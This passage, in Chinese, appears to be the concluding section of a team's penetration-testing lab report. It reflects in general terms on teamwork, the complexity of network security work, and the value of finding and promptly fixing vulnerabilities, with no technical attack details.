通过这次实验，我们深刻体会到团队合作的重要性和科学分工的必要性。每个成员在各自的领域内深入研究，充分发挥了个人的特长，同时通过密切的沟通和合作，确保了实验的顺利进行。实验中遇到的问题和挑战，让我们认识到网络安全工作的复杂性和细致性，也提醒我们在未来的工作中，要时刻保持警惕，不断学习和更新知识，提升自身的技术能力。

此外，通过对漏洞的发现和修复建议的提出，我们也深刻认识到预防和及时修复安全漏洞的重要性。只有通过不断地学习和实践，才能真正提升网络系统的安全性，防止潜在的攻击和威胁。

总的来说，这次实验不仅是一次技术上的提升，更是一次全面的学习和成长。我们不仅提升了渗透测试的实际操作能力，也增强了对网络安全的整体认识。我们相信，通过不断地学习和实践，我们的团队将在未来的网络安全工作中取得更大的进步和成就。